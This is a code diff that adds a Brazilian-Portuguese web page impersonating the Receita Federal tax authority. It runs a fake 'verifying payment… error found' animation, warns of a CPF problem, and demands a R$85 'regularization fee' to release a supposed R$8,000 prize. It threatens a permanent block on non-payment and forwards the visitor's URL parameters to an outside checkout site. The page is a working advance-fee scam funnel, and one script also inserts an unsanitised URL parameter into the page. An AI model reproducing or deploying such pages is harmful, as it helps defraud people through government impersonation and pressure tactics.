@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upsell 4 - Pendência Receita Federal</title>
+    <script>
+        localStorage.setItem("upsell", "up7");
+    </script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #eef2f3;
+        }
+
+        .header {
+            background-color: #004080;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header img {
+            width: 65%;
+            padding: 0%;
+            margin-bottom: 0%;
+            margin-top: -5%;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: calc(100vh - 100px);
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #002776, #0044cc);
+            color: white;
+        }
+
+        .container h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            margin-top: -35%;
+            font-weight: bold;
+        }
+
+        .loading {
+            font-size: 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading span {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+
+        .loading-bar {
+            width: 80%;
+            height: 8px;
+            background-color: #cce5ff;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+
+        .loading-bar div {
+            height: 100%;
+            width: 0;
+            background-color: #ffcc00;
+            animation: loading 6s linear forwards;
+        }
+
+        @keyframes loading {
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        .container p {
+            font-size: 18px;
+            margin: 15px 0;
+        }
+
+        .container .highlight {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+
+        .action {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .action button {
+            background-color: #ffcc00;
+            color: #002776;
+            border: none;
+            padding: 15px 25px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .action button:hover {
+            background-color: #ffd633;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #cce5ff;
+        }
+
+        .footer strong {
+            color: #ffcc00;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const container = document.querySelector(".container");
+            const actionSection = document.querySelector(".action");
+            const loadingBar = document.querySelector(".loading-bar div");
+            const loadingElements = document.querySelectorAll(".loading, .loading-bar");
+            let step = 0;
+
+            const steps = [
+                "Verificando pagamento...",
+                "Verificando dados...",
+                "Erro encontrado!"
+            ];
+
+            const interval = setInterval(() => {
+                if (step < steps.length) {
+                    container.querySelector("h1").textContent = steps[step];
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    container.querySelector("h1").textContent = "⚠️ Pendência na Receita Federal!";
+                    loadingElements.forEach(el => el.style.display = "none");
+                    actionSection.style.display = "block";
+                }
+            }, 2000);
+
+            loadingBar.style.animationPlayState = 'running';
+        });
+    </script>
+</head>
+
+<body>
+
+    <div class="header">
+        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Receita Federal">
+    </div>
+
+    <div class="container">
+        <h1>⚠️ Verificando...</h1>
+        <div class="loading">
+            <span>Processando informações...</span>
+        </div>
+        <div class="loading-bar">
+            <div></div>
+        </div>
+
+        <div class="action">
+            <p>Identificamos uma pendência relacionada ao seu <span class="highlight">CPF</span>.</p>
+            <p>Para resolver, é necessário efetuar o pagamento da <span class="highlight">Taxa de Regularização</span>.
+            </p>
+            <p>O valor é de <span class="highlight">R$ 85,00</span>. Após o pagamento, seu prêmio de <span class="highlight">R$8.000,00</span> será liberado
+                imediatamente!</p>
+
+            <div class="cta">
+                <button onclick="checkout(event)">REGULARIZAR AGORA</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o bloqueio definitivo do seu saque.
+        </div>
+    </div>
+
+    <script>
+        function checkout(event) {
+            event.preventDefault();
+            var currentUrlParams = window.location.search;
+            window.location.href = "https://pagamentooficial.sbs/checkout/up-6/" + currentUrlParams;
+        }
+    </script>
+
+    <script>
+        function getQueryParam(param) {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(param);
+        }
+
+        const cpf = getQueryParam("name");
+        if (cpf) {
+            const cpfMsg = document.getElementById("cpf-msg");
+            cpfMsg.innerHTML = `Identificamos uma pendência relacionada ao seu <span class="highlight">CPF ${cpf}</span>.`;
+        }
+    </script>
+
+
+
+</body></html>
